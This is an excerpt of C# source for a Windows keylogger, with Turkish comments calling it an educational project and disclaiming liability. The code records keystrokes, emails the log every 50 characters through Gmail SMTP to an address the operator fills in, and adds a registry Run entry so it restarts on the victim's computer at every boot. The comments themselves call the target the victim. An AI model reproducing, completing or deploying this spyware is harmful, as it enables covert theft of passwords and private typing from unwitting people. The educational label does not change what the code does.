// TAMAMEN EGITIM AMACLI BIR KEYLOGGER PROJESIDIR
// BILGISAYARINIZA ZARAR VERMEZ
// BILGISAYARINIZA ZARAR VERMEYEN KODLARI BILE BAZI ANTIVIRUS PROGRAMLARI TEHLIKELI OLARAK ALGILAYABILIR
// BU PROJEDEKI KODLARIN KULLANIMINDAN DOGACAK HERHANGI BIR SORUNDA SORUMLULUK KABUL ETMEMEKTEYIM
// YAPACAGINIZ HERHANGI BIR KULLANIMDA YASAL SORUMLULUK KULLANICIYA AITTIR
...
using Microsoft.Win32;    //pc her acildiginda kurbanin bilgisayarinda tekrar acilacak
using HootKeys;
...
namespace klog
{
    public partial class Form1 : Form
    {
        ...
        int number = 0;
        string log = "";
        bool BigChar = true;  //capslock icin kullaniyoruz true = caps acik
        ...
        void Mail()
        {
                ...
                msj.Subject = "#LOG";
                msj.From = new MailAddress("GONDERICI MAIL");
                msj.To.Add("GONDERILMESINI ISTEDIGINIZ MAIL");

                SmtpClient istemci = new SmtpClient();
                
                // Modern kimlik doğrulama için ayarlar
                istemci.Credentials = new System.Net.NetworkCredential("GONDERICI MAIL", "GONDERICI MAIL SIFRE"); // eger 2fa aciksa uygulama sifresi almaniz yeterli.
                istemci.Port = 587;
                istemci.Host = "smtp.gmail.com"; //kullandiginiz mail turuna bagli degiskenlik gosterebilir.
        ...
        {
            if(number == 50)  //50 karakterden sonra mail at
            {
                Mail();
                number = 0;
                log = "";
        ...
        private void Form1_Load(object sender, EventArgs e)
        {
            ...
            key.SetValue("klog", "\"" + Application.ExecutablePath + "\""); //klog yerine uygulama adini girebilirsiniz burada uygulamanin baslangic uygulama olmasini sagliyoruz.
